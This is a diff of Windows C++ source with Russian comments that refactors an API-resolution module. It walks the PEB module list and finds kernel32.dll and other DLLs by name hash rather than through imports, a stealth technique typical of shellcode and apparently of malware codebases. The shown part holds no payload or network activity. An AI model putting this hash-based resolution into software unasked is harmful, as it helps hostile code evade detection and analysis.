@@ -1,26 +1,22 @@
 #include <windows.h>
 
 #include "Getapi.h"
-#include "Crypt.h"
+#include "ntdll.h"
 #include "Strings.h"
 #include "Memory.h"
-#include "Utils.h"
-#include "ntdll.h"
 
 
 
 
-//----------------------------------------------------------------
-//  Глобальный блок памяти для кеширования апи адресов
-//----------------------------------------------------------------
+//--------------------------------------------
+//  Глобальный блок памяти для кеширования
+// апи адресов
+//--------------------------------------------
 LPVOID* GlobalApiCache = NULL;
-//----------------------------------------------------------------
 
-
-
-//----------------------------------------------------------------
+//--------------------------------------------
 //  Адрес библиотеки ядра
-//----------------------------------------------------------------
+//--------------------------------------------
 HMODULE KernelModuleAddr = NULL;
 
 
@@ -147,8 +143,12 @@ BOOL InitializeAPI()
 	// Инициализируем глобальный кэш
 	if (ApiCacheSize > 0)
 	{
-		GlobalApiCache = (LPVOID*)MemAlloc((ApiCacheSize + 1)*sizeof(LPVOID));
-		m_memset(GlobalApiCache, 0, (ApiCacheSize + 1)*sizeof(LPVOID));
+		GlobalApiCache = (LPVOID*)pVirtualAlloc(0, (ApiCacheSize + 1)*sizeof(LPVOID), 
+												MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+		for (int i = 0; i <= ApiCacheSize; i++) GlobalApiCache[i] = 0;
+
+			//(LPVOID*)MemAlloc((ApiCacheSize + 1)*sizeof(LPVOID));
+		//m_memset(GlobalApiCache, 0, (ApiCacheSize + 1)*sizeof(LPVOID));
 	}
 
 
@@ -157,6 +157,7 @@ BOOL InitializeAPI()
 }
 //-----------------------------------------------------------------------------
 
+/*
 DWORD pGetLastError()
 {
 	DWORD dwRet = 0;
@@ -170,60 +171,47 @@ DWORD pGetLastError()
 
 	return dwRet;
 }
+*/
 //----------------------------------------------------------------------------
 
+
+//--------------------------------------------------
+//  GetPEB - Функция возвращает адрес структуры PEB
+//--------------------------------------------------
+LPVOID GetPEB()
+{
+	#ifdef _WIN64
+		return  (LPVOID)__readgsqword(0x60);
+	#else
+		// Для совместимости с Builder C++ x32 оставляем асм вставку
+		LPVOID PEB;
+		__asm
+		{
+			mov eax, FS:[0x30]
+			mov [PEB], eax
+		}
+        return PEB;
+	#endif
+
+}
+
+//--------------------------------------------------
+//  GetKernel32 - Функция возвращает адрес
+//                kernel32.dll
+//--------------------------------------------------
 HMODULE GetKernel32(void)
 {
 
-	if (KernelModuleAddr)
-		return KernelModuleAddr;
-
-
-	PPEB Peb = NULL;
-
-    __asm
-	{
-		mov eax, FS:[0x30]
-		mov [Peb], eax
-	}
-
-	PPEB_LDR_DATA LdrData = Peb->Ldr;
-    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
-    PLIST_ENTRY Entry = Head->Flink;
-
-    while ( Entry != Head )
-    {
-		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    
-
-		WCHAR wcDllName[MAX_PATH];
-
-		m_memset( (char*)wcDllName, 0, sizeof( wcDllName ) );
-
-        m_wcsncpy( wcDllName, LdrData->BaseDllName.Buffer, Min( MAX_PATH - 1, LdrData->BaseDllName.Length / sizeof( WCHAR ) ) );
-
-        if ( CalcHashW( m_wcslwr( wcDllName ) ) == 0x4B1FFE8E /* kernel32.dll */)
-		{
-			KernelModuleAddr = (HMODULE)LdrData->DllBase;
-            return (HMODULE)LdrData->DllBase;
-        }
-
-        Entry = Entry->Flink;
-    }
-
-    return NULL;
+	if (!KernelModuleAddr)
+		KernelModuleAddr = GetDllBase(0x4B1FFE8E /* kernel32.dll */);
+	return KernelModuleAddr;
 }
 //----------------------------------------------------------------------------
 
 
-HMODULE GetDllBase( DWORD dwDllHash )
+HMODULE GetDllBase(DWORD DllHash)
 {    
-	PPEB Peb = NULL;
-
-	__asm
-	{
-		mov eax, FS:[0x30]
-		mov [Peb], eax
-	}
+	PPEB Peb = (PPEB)GetPEB();
 
 	PPEB_LDR_DATA LdrData = Peb->Ldr;
     PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
@@ -233,35 +221,27 @@ HMODULE GetDllBase( DWORD dwDllHash )
     {
 		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    
 
-		WCHAR wcDllName[MAX_PATH];
-
-		m_memset( (char*)wcDllName, 0, sizeof( wcDllName ) );
-
-		m_wcsncpy( wcDllName, LdrData->BaseDllName.Buffer, Min( MAX_PATH - 1, LdrData->BaseDllName.Length / sizeof( WCHAR ) ) );
-		if ( CalcHashW( m_wcslwr( wcDllName ) ) == dwDllHash )
-        {
+		DWORD Hash = STRW::Hash(LdrData->BaseDllName.Buffer, LdrData->BaseDllName.Length, false);
+		if (Hash == DllHash)
 			return (HMODULE)LdrData->DllBase;
-        }
-
-        Entry = Entry->Flink;
+		Entry = Entry->Flink;
     }
-
-    return NULL;
+	return NULL;
 }
+
 
 LPVOID GetForvardedProc(PCHAR Name)
 {
 	// Функция обработки переназначения экспорта
 	// На входе должна быть строка DllName.ProcName или DllName.#ProcNomber
-	if (Name == NULL)
- 		return NULL;
+	if (Name == NULL) return NULL;
 
 	char DLLName[255];
 	m_memset(DLLName, 0, sizeof(DLLName));
 
-	PCHAR NameStr = STR::Scan(Name, '.');
-	if (NameStr == NULL)
-		return NULL;
+	PCHAR NameStr = STRA::Scan(Name, '.');
+	if (!NameStr) return NULL;
+
 
 	// Собираем имя библиотеки
 	m_memcpy(DLLName, Name, NameStr - Name);
